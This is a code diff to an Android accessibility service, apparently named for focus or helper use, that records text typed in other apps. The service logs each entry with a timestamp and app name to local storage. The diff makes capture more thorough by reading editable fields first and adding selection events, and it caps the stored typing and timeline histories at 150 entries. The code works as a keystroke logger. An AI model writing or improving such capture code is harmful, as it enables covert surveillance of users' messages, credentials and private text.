@@ -74,23 +74,22 @@ public class FocusAccessibilityService extends AccessibilityService {
 
         // 2. FIELD 2: TYPED TEXT (Keypad se kitne samaye me kya text type kiya)
         if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
-            eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+            eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
+            eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
 
             String typedText = "";
 
-            if (event.getText() != null && !event.getText().isEmpty()) {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null && source.isEditable()) {
+                typedText = extractTextFromNode(source);
+            }
+
+            if (typedText.isEmpty() && event.getText() != null && !event.getText().isEmpty()) {
                 StringBuilder sb = new StringBuilder();
                 for (CharSequence cs : event.getText()) {
                     if (cs != null) sb.append(cs.toString()).append(" ");
                 }
                 typedText = sb.toString().trim();
-            }
-
-            if (typedText.isEmpty()) {
-                AccessibilityNodeInfo source = event.getSource();
-                if (source != null && source.isEditable()) {
-                    typedText = extractTextFromNode(source);
-                }
             }
 
             if (typedText.startsWith("[") && typedText.endsWith("]")) {
@@ -144,7 +143,17 @@ public class FocusAccessibilityService extends AccessibilityService {
             String time = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault()).format(new Date());
             String newEntry = "⌨️ [" + time + "] (" + app + ")\n👉 " + text + "\n-------------------------\n";
 
-            sp.edit().putString("history", newEntry + currentLogs).apply();
+            String combined = newEntry + currentLogs;
+            String[] parts = combined.split("-------------------------\n");
+            StringBuilder sb = new StringBuilder();
+            int limit = Math.min(parts.length, 150);
+            for (int i = 0; i < limit; i++) {
+                String trimmed = parts[i].trim();
+                if (!trimmed.isEmpty()) {
+                    sb.append(trimmed).append("\n-------------------------\n");
+                }
+            }
+            sp.edit().putString("history", sb.toString()).apply();
         } catch (Exception ignored) {}
     }
 
@@ -152,7 +161,17 @@ public class FocusAccessibilityService extends AccessibilityService {
         try {
             SharedPreferences sp = getSharedPreferences("HelperLogs", Context.MODE_PRIVATE);
             String currentTimeline = sp.getString("timeline_history", "");
-            sp.edit().putString("timeline_history", timelineEntry + currentTimeline).apply();
+            String combined = timelineEntry + currentTimeline;
+            String[] parts = combined.split("-------------------------\n");
+            StringBuilder sb = new StringBuilder();
+            int limit = Math.min(parts.length, 150);
+            for (int i = 0; i < limit; i++) {
+                String trimmed = parts[i].trim();
+                if (!trimmed.isEmpty()) {
+                    sb.append(trimmed).append("\n-------------------------\n");
+                }
+            }
+            sp.edit().putString("timeline_history", sb.toString()).apply();
         } catch (Exception ignored) {}
     }
 
